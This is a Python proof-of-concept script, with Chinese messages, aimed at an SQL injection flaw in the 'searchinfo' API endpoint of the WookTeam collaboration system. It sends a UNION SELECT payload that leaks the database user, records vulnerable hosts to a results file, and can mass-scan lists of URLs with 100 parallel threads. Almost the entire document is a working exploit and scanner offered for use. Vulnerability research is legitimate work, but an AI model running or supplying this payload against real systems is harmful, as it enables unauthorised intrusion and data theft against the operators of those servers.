import argparse
import requests
import os
import sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()



def banner():
    test = '''
                         _     _        __      
                        | |   (_)      / _|     
 ___  ___  __ _ _ __ ___| |__  _ _ __ | |_ ___  
/ __|/ _ \/ _` | '__/ __| '_ \| | '_ \|  _/ _ \ 
\__ \  __/ (_| | | | (__| | | | | | | | || (_) |
|___/\___|\__,_|_|  \___|_| |_|_|_| |_|_| \___/ 
                                               author:sanhua
                                               ate:2024-09-08
                                               version:1.0
    '''
    print(test)


def poc(target):
    payload = "/api/users/searchinfo?where[username]=1%27%29+UNION+ALL+SELECT+NULL%2CCONCAT%280x7e%2Cuser%28%29%2C0x7e%29%2CNULL%2CNULL%2CNULL%23"
    headers = {
    "Cache-Control": "max-age=0",
    "Upgrade-Insecure-Requests": "1",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 Edg/128.0.0.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6",
    }
    try:
        response = requests.get(url=target+payload, headers=headers, verify=False,timeout=5)
        if response.status_code == 200 and "username" in response.text:
            print(f"[+] {target} 存在SQL注入漏洞")
            with open("result.txt", "a",encoding='utf-8') as f:
                f.write(f"{target} 存在SQL注入漏洞\n")
        else:
            print(f"[+] {target} 不存在SQL注入漏洞")
    except Exception as e:
            print(f"[!] {target} 请求失败，错误信息：{e}")




def main():
    banner()
    url_list = []
    parse = argparse.ArgumentParser(description="轻量级的团队在线协作系统接口searchinfo存在SQL注入漏洞")
    parse.add_argument("-u", "--url", dest="url", type=str, help="Please enter url")
    parse.add_argument("-f", "--file", dest="file", type=str, help="Please enter file")
    args = parse.parse_args()

    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        if not os.path.exists(args.file):
            print(f"[!] {args.file} 文件不存在，请检查路径")
            return
        with open(args.file, 'r', encoding='utf-8') as f:
            for url in f.readlines():
                url = url.strip()
                if url:  # 确保不添加空行
                    url_list.append(url)
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usage:\n\t WookTeam轻量级的团队在线协作系统接口searchinfo存在SQL注入漏洞.py -h")


if __name__ == '__main__':
    main()